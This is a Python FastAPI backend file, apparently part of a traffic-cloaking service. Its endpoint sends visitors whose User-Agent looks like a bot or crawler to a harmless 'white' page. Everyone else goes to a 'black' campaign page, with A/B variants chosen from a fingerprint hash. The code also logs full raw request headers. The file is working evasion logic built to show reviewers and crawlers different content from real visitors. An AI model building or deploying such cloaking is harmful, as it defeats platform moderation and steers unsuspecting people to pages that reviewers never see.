from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel
import hashlib
import databutton as db
import json # Para logar dicts de forma mais legível

router = APIRouter(prefix="/worker-logic", tags=["Worker Logic"])

class WorkerValidationRequest(BaseModel):
    fingerprint: str
    campaign_id: str

class WorkerValidationResponse(BaseModel):
    is_bot: bool
    target_url: str

def get_campaign_urls(campaign_id: str, fingerprint_hash_prefix: str) -> tuple[str | None, str | None]:
    default_safe_white_url = "https://default.safe.fallback.com/storage-error"
    chosen_black_url = None
    print(f"[BACKEND LOG] get_campaign_urls called for campaign_id: {campaign_id}, fp_hash_prefix: {fingerprint_hash_prefix}")
    try:
        link_config_key = f"link_config_{campaign_id}"
        print(f"[BACKEND LOG] Attempting to get from db.storage.json with key: {link_config_key}")
        campaign_config = db.storage.json.get(link_config_key) # Retorna dict ou None

        if not campaign_config: # Checa se é None ou dict vazio
            print(f"[BACKEND LOG] Campaign config NOT FOUND or EMPTY in db.storage for key: {link_config_key}")
            return None, default_safe_white_url
        
        print(f"[BACKEND LOG] Campaign config FOUND for {link_config_key}: {json.dumps(campaign_config)}")

        white_url = campaign_config.get("white_url")
        if not white_url:
            print(f"[BACKEND LOG] white_url missing in config for {link_config_key}. Using default.")
            white_url = default_safe_white_url
        
        black_url_a = campaign_config.get("black_url_a")
        black_url_b = campaign_config.get("black_url_b")

        if black_url_a:
            chosen_black_url = black_url_a
            if black_url_b:
                if int(fingerprint_hash_prefix, 16) >= 8:
                    chosen_black_url = black_url_b
                    print(f"[BACKEND LOG] Variant B selected for campaign {campaign_id}")
                else:
                    print(f"[BACKEND LOG] Variant A selected for campaign {campaign_id}")
            else:
                 print(f"[BACKEND LOG] Variant A (only black option) for campaign {campaign_id}")
        else:
            print(f"[BACKEND LOG] No black_url_a for campaign {campaign_id}.")
        
        print(f"[BACKEND LOG] Returning from get_campaign_urls: chosen_black_url='{chosen_black_url}', white_url='{white_url}'")
        return chosen_black_url, white_url

    except Exception as e:
        print(f"[BACKEND LOG] CRITICAL ERROR in get_campaign_urls for {campaign_id}: {e}")
        import traceback
        traceback.print_exc()
        return None, default_safe_white_url

@router.post("/validate-for-worker", response_model=WorkerValidationResponse)
async def validate_for_worker(request_data: WorkerValidationRequest, raw_request: Request):
    print(f"[BACKEND LOG - VERY START] Raw Request Headers: {json.dumps(dict(raw_request.headers))}")
    print(f"[BACKEND LOG] START /validate-for-worker endpoint hit.")
    print(f"[BACKEND LOG] Raw Request Headers: {json.dumps(dict(raw_request.headers))}")
    print(f"[BACKEND LOG] Request Body (parsed by Pydantic): {request_data.model_dump_json()}")

    client_ip = raw_request.client.host if raw_request.client else "unknown"
    user_agent = raw_request.headers.get("user-agent", "unknown")
    
    print(f"[BACKEND LOG] Extracted: IP: {client_ip}, UA: {user_agent[:30]}..., Campaign: {request_data.campaign_id}, FP: {request_data.fingerprint[:20]}...")

    is_bot_decision = False # Default to human
    if "bot" in user_agent.lower() or "spider" in user_agent.lower() or "crawler" in user_agent.lower():
        is_bot_decision = True
        print(f"[BACKEND LOG] Basic bot detected by User-Agent: {user_agent}")

    hasher = hashlib.sha256()
    hasher.update(request_data.fingerprint.encode('utf-8'))
    fingerprint_hash_hex = hasher.hexdigest()
    fingerprint_hash_prefix = fingerprint_hash_hex[0]
    print(f"[BACKEND LOG] Fingerprint hash prefix for A/B: {fingerprint_hash_prefix}")

    chosen_black_url, white_url = get_campaign_urls(request_data.campaign_id, fingerprint_hash_prefix)

    if not white_url:
        print(f"[BACKEND LOG] CRITICAL FALLBACK: No white_url after get_campaign_urls. This indicates a serious issue.")
        white_url = "https://critical.fallback.safe.page.com/worker-error-final" 

    target_final_url = white_url
    if not is_bot_decision:
        if chosen_black_url:
            target_final_url = chosen_black_url
            print(f"[BACKEND LOG] Human, final target (black): {target_final_url}")
        else:
            print(f"[BACKEND LOG] Human, but no black URL. Using white: {white_url}")
            target_final_url = white_url
    else:
        print(f"[BACKEND LOG] Bot detected, final target (white): {white_url}")
        target_final_url = white_url
    
    response_payload = WorkerValidationResponse(is_bot=is_bot_decision, target_url=target_final_url)
    print(f"[BACKEND LOG] END /validate-for-worker. Response payload: {response_payload.model_dump_json()}")
    return response_payload